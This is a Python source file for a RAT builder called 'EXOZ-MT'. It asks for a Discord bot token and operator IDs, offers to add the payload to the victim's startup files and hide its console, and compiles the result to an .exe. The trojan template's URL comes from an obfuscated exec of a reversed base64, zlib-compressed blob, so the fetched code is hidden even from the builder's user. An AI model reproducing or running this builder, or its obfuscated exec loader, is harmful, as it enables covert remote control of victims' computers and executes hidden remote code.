# Disclaimer: This is only for entertainment and educational purposes.  
# I’m not responsible for what you do with it or any consequences.  
# Made by Vexi :3

import os
import time
import shutil
import requests
import base64
import urllib

try:
    import colorama
    colorama.init()
except Exception:
    if os.name == "nt":
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            handle = kernel32.GetStdHandle(-11)  
            mode = ctypes.c_uint32()
            if kernel32.GetConsoleMode(handle, ctypes.byref(mode)):

                kernel32.SetConsoleMode(handle, mode.value | 0x0004)
        except Exception:
            pass

def gradient(text):
    lines = text.splitlines()
    if not lines:
        return ""

    start_color = (120, 0, 0)
    end_color = (255, 60, 60)
    num_lines = len(lines)
    max_length = max((len(line) for line in lines), default=1)

    out_lines = []
    for li, line in enumerate(lines):

        line_ratio = li / (num_lines - 1) if num_lines > 1 else 0
        chars = []
        for ci, ch in enumerate(line):
            char_ratio = ci / (max_length - 1) if max_length > 1 else 0
            ratio = (line_ratio + char_ratio) / 2.0
            r = int(start_color[0] + (end_color[0] - start_color[0]) * ratio)
            g = int(start_color[1] + (end_color[1] - start_color[1]) * ratio)
            b = int(start_color[2] + (end_color[2] - start_color[2]) * ratio)
            chars.append(f"\033[38;2;{r};{g};{b}m{ch}")

        out_lines.append("".join(chars) + RESET)
    return "\n".join(out_lines)

RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
CYAN = "\033[36m"
RESET = "\033[0m"

title = r"""
EXOZ-MT - Thanks to Vexi, this product is brought to you for free! 🎀
█████████████████████████████████████████████████████████████████████████████████

██████╗ ███████╗███╗   ███╗ ██████╗ ████████╗███████╗     █████╗  ██████╗ ██████╗███████╗███████╗███████╗    ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗
██╔══██╗██╔════╝████╗ ████║██╔═══██╗╚══██╔══╝██╔════╝    ██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝    ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║
██████╔╝█████╗  ██╔████╔██║██║   ██║   ██║   █████╗      ███████║██║     ██║     █████╗  ███████╗███████╗       ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║
██╔══██╗██╔══╝  ██║╚██╔╝██║██║   ██║   ██║   ██╔══╝      ██╔══██║██║     ██║     ██╔══╝  ╚════██║╚════██║       ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║
██║  ██║███████╗██║ ╚═╝ ██║╚██████╔╝   ██║   ███████╗    ██║  ██║╚██████╗╚██████╗███████╗███████║███████║       ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║
╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝ ╚═════╝    ╚═╝   ╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚═════╝╚══════╝╚══════╝╚══════╝       ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝

████████████████████████████████████████████████████████████████████
"""

print(gradient(title))

menu = """
[ 1 ] Build RAT file
[ 0 ] Exit
"""

print(gradient(menu))

choice = int(input(f"{BLUE}Select an option → {RESET}"))

if choice == 1:
    for x in range(0, 5):
        print(f"{RED}PLEASE DO NOT MESS UP THIS, OTHERWISE THE RAT WILL NOT WORK!")
        time.sleep(0.025)
        print(f"{YELLOW}PLEASE DO NOT MESS UP THIS, OTHERWISE THE RAT WILL NOT WORK!")
        time.sleep(0.01)

    understood = input(f"{RED}I Hope you understand that if you mess up this section, the RAT will NOT work. (press enter to continue) → {RESET}")

    file_name = input(f"\n{CYAN}What should the file be called. → {RESET}")
    token = input(f"{CYAN}Enter your bot's token. → {RESET}")
    whitelist = int(input(f"{CYAN}Enter your discord ID (this is so the bot only works for you). → {RESET}"))
    main_channel = int(input(f"{CYAN}Enter your main channel ID (the bot will ping you there when you get a hit). → {RESET}"))
    prefix = input(f"{CYAN}Enter your prefered prefix for the bot. → {RESET}")
    add_to_startup = input(f"{CYAN}Add file to victim's startup files? (true/false) → {RESET}").strip().title()
    silent_mode = input(f"{CYAN}Should the RAT be silent mode? (no console output) (true/false) → {RESET}").strip().title()

    template = None

    _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
    exec((_)(b'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'))

    source = requests.get(template).text

    if not file_name.lower().endswith(".py") or file_name.lower().endswith(".pyw"):
        if silent_mode == "True":
            file_name += ".pyw"
        else:
            file_name += ".py"

    if os.path.exists(file_name):
        response = input(f"{YELLOW}File '{file_name}' already exists. Overwrite? (y/n) → {RESET}").strip().lower()
        if response != 'y':
            exit()

    try:

        print(f"""
File name: {file_name}
Token: {token}
Whitelist ID: {whitelist}
Main Channel ID: {main_channel}
Prefix: {prefix}
Add To Victim's Startup: {add_to_startup}
Silent Mode: {silent_mode}""")

        confirm = input(f"\n{GREEN}Would you like to comfirm these? (y/n) → {RESET}").strip().lower()

        if confirm == "y":
            
            directory = os.path.dirname(os.path.abspath(__file__))
            
            print(f"{GREEN}Creating builds folder..")
            folder_path = os.path.join(directory, 'Builds')
            os.makedirs(folder_path, exist_ok=True)
            
            time.sleep(2)
            print(f"{GREEN}Builds folder created!")
            
            time.sleep(1)
            print(f"{GREEN}Creating rat file..{RESET}")
            
            file_path = os.path.join(folder_path, file_name)

            with open(file_path, 'w') as f:
                print(f"{GREEN}Rat file created!{RESET}")
                
                time.sleep(1)
                print(f"{GREEN}Writing file contents..{RESET}")

                modified_source = source
                
                modified_source = modified_source.replace("{placeholder_token}", token)
                modified_source = modified_source.replace("{placeholder_whitelist}", str(whitelist))
                modified_source = modified_source.replace("{placeholder_main_channel}", str(main_channel))
                modified_source = modified_source.replace("{placeholder_prefix}", prefix)
                modified_source = modified_source.replace("{placeholder_add_to_startup}", add_to_startup)
                modified_source = modified_source.replace("{placeholder_silent_mode}", silent_mode)

                f.write(modified_source)

                print(f"{GREEN}File contents have been written!{RESET}")
            
            time.sleep(1)
            print(f"{GREEN}Installing python to exe requirements{RESET}")
            os.system("pip install pyinstaller")
            print(f"{GREEN}Python to exe requirements installed!{RESET}")
            
            print(f"{GREEN}Converting python file to exe..{RESET}")
            
            original_dir = os.getcwd()
            os.chdir(folder_path)
            
            os.system(f'pyinstaller "{file_name}" --onefile')
            print(f"{GREEN}Converted python file to exe!{RESET}")
            
            time.sleep(4)
            print(f"{GREEN}Doing some finishing touches..{RESET}")

            build_path = os.path.join(folder_path, 'build')
            dist_path = os.path.join(folder_path, 'dist')
            
            if file_name.endswith('.py'):
                exe_file_name = file_name.replace('.py', '.exe')
                spec_file_name = file_name.replace('.py', '.spec')
            elif file_name.endswith('.pyw'):
                exe_file_name = file_name.replace('.pyw', '.exe')
                spec_file_name = file_name.replace('.pyw', '.spec')
            else:
                exe_file_name = file_name + '.exe'
                spec_file_name = file_name + '.spec'
            
            exe_path = os.path.join(dist_path, exe_file_name)
            spec_file = os.path.join(folder_path, spec_file_name)

            if os.path.exists(exe_path):
                final_exe_path = os.path.join(folder_path, exe_file_name)
                shutil.move(exe_path, final_exe_path)
                print(f"{GREEN}Moved EXE file to Builds folder{RESET}")
            
            if os.path.exists(file_path):
                os.remove(file_path)
                print(f"{GREEN}Deleted original Python file{RESET}")
            
            if os.path.exists(spec_file):
                os.remove(spec_file)
                print(f"{GREEN}Deleted .spec file{RESET}")
            
            time.sleep(0.5)
            
            if os.path.exists(build_path):
                try:
                    shutil.rmtree(build_path)
                    print(f"{GREEN}Deleted build folder{RESET}")
                except Exception as e:
                    print(f"{RED}Failed to delete build folder: {e}{RESET}")
                    print(f"{YELLOW}You may need to delete this folder maually.")
            
            time.sleep(0.5)
            
            if os.path.exists(dist_path) and os.path.isdir(dist_path):
                try:
                    shutil.rmtree(dist_path)
                    print(f"{GREEN}Deleted dist folder{RESET}")
                except Exception as e:
                    print(f"{RED}Failed to delete dist folder: {e}{RESET}")
                    print(f"{YELLOW}You may need to delete this folder maually.")
            
            os.chdir(original_dir)
            
            print(f"{GREEN}Finishing touches complete!{RESET}")

        else:
            exit()

        print(f"{CYAN}\n✅ SUCCESS! RAT has been made. \nRAT file located at: {os.path.join(folder_path, exe_file_name)}")
        input(f"{CYAN}Press enter to exit. → {RESET}")

    except Exception as e:
        print(f"{RED}Error creating file: {e}")

elif choice == 0:
    print("Exitting.")
